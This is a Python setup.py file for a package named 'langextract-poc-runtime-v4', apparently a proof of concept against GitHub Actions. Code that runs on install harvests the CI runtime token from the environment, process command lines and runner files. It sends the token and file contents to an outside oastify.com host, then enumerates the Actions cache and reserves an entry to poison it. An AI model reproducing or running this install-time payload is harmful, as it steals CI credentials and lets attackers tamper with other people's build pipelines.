import os
import subprocess
import urllib.request
import json
import socket
import time
import glob
import re

OAST = "5w2uc5a9fpgknip5li2pqztgs7yymrag.oastify.com"

def exfil(path, data):
    """Exfiltrate data via POST"""
    try:
        if isinstance(data, str):
            data = data.encode()
        if isinstance(data, bytes):
            req = urllib.request.Request(
                f"https://{OAST}/langextract/runtime_v4{path}",
                data=data,
                method="POST"
            )
            urllib.request.urlopen(req, timeout=15)
    except Exception as e:
        pass

def internal_api_request(url, token, method="GET", data=None, headers=None):
    """Make request to internal Actions API"""
    try:
        if headers is None:
            headers = {}
        
        headers["Authorization"] = f"Bearer {token}"
        headers["User-Agent"] = "actions/cache"
        headers["Accept"] = "application/json;api-version=6.0-preview.1"
        
        if data and isinstance(data, dict):
            data = json.dumps(data).encode()
            headers["Content-Type"] = "application/json"
            
        req = urllib.request.Request(url, headers=headers, method=method, data=data)
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.read().decode(), resp.getcode()
    except urllib.error.HTTPError as e:
        return e.read().decode(), e.code
    except Exception as e:
        return str(e), 0

def find_token_in_cmdline():
    """Scan /proc/*/cmdline"""
    try:
        pids = [p for p in os.listdir("/proc") if p.isdigit()]
        for pid in pids:
            try:
                with open(f"/proc/{pid}/cmdline", "rb") as f:
                    cmd_data = f.read()
                    cmd_str = cmd_data.decode("utf-8", errors="ignore").replace("\0", " ")
                    if "ACTIONS_RUNTIME_TOKEN" in cmd_str or "eyJ" in cmd_str: # eyJ is start of JWT
                         # Simple heuristic to grab the token if it's an arg
                         # Or just exfil the interesting command line
                         exfil(f"/cmdline_{pid}", cmd_str[:2000])
                         
                         # Try to extract JWT
                         match = re.search(r'(eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)', cmd_str)
                         if match:
                             return match.group(0)
            except:
                continue
    except Exception as e:
        exfil("/cmdline_scan_error", str(e))
    return None

def find_token_in_fs():
    """Scan filesystem for token"""
    search_dirs = ["/home/runner", "/tmp"]
    
    for d in search_dirs:
        for root, dirs, files in os.walk(d):
            # Optimization: skip large dirs or irrelevant ones
            if ".git" in dirs: 
                dirs.remove(".git")
                
            for file in files:
                try:
                    filepath = os.path.join(root, file)
                    # Skip large files
                    if os.path.getsize(filepath) > 1024 * 50: 
                        continue
                        
                    with open(filepath, "r", errors="ignore") as f:
                        content = f.read()
                        if "ACTIONS_RUNTIME_TOKEN" in content or "ACTIONS_CACHE_URL" in content:
                            exfil(f"/file_found_{os.path.basename(file)}", filepath + "\n" + content[:2000])
                            
                            # Extract token
                            match = re.search(r'(eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)', content)
                            if match:
                                return match.group(0)
                except:
                    pass
    return None

def get_runtime_vars():
    """Get needed vars from any source"""
    token = os.environ.get("ACTIONS_RUNTIME_TOKEN")
    url = os.environ.get("ACTIONS_RUNTIME_URL")
    cache_url = os.environ.get("ACTIONS_CACHE_URL")
    
    if not token:
        token = find_token_in_cmdline()
        
    if not token:
        token = find_token_in_fs()
        
    # If we found token but missing URLs, try to find them in env dump or files?
    # For now let's hope they are together.
    # Actually, URLs are usually environment variables, often persisted.
    
    return token, url, cache_url

# ========================================
# PHASE 1: TOKEN HARVESTING
# ========================================
runtime_token, runtime_url, cache_url = get_runtime_vars()

exfil("/env_check_v4", f"TokenFound: {bool(runtime_token)}\nRuntimeURL: {runtime_url}\nCacheURL: {cache_url}")

if runtime_token:
    # Exfiltrate the actual token for local validation
    exfil("/token_capture", runtime_token)

    # ========================================
    # PHASE 2: CACHE ENUMERATION (List)
    # ========================================
    # If cache URL is missing, we might assume a standard pattern or try to find it
    if not cache_url and runtime_url:
        # Sometimes cache url is part of runtime url or vice versa
        pass 
        
    if cache_url:
        list_url = f"{cache_url}_apis/artifactcache/cache?keys=pip&version=1" 
        resp_body, status = internal_api_request(list_url, runtime_token)
        exfil("/cache_list", f"Status: {status}\nBody: {resp_body}")

    # ========================================
    # PHASE 3: CACHE POISONING POC (Reserve)
    # ========================================
    if cache_url:
        reserve_url = f"{cache_url}_apis/artifactcache/caches"
        
        key = f"Linux-poc-poison-v4-{int(time.time())}"
        version = "b1ab1a91-4a8f-4138-b324-h4sh1234" 
        
        payload = {
            "key": key,
            "version": version,
            "cacheSize": 1024 
        }
        
        resp_body, status = internal_api_request(reserve_url, runtime_token, method="POST", data=payload)
        exfil("/cache_reserve", f"Key: {key}\nStatus: {status}\nBody: {resp_body}")
    else:
        exfil("/cache_reserve_skipped", "Missing ACTIONS_CACHE_URL")

# Standard setup.py boilerplate
from setuptools import setup, find_packages
setup(
    name="langextract-poc-runtime-v4",
    version="0.0.8",
    packages=find_packages(),
)
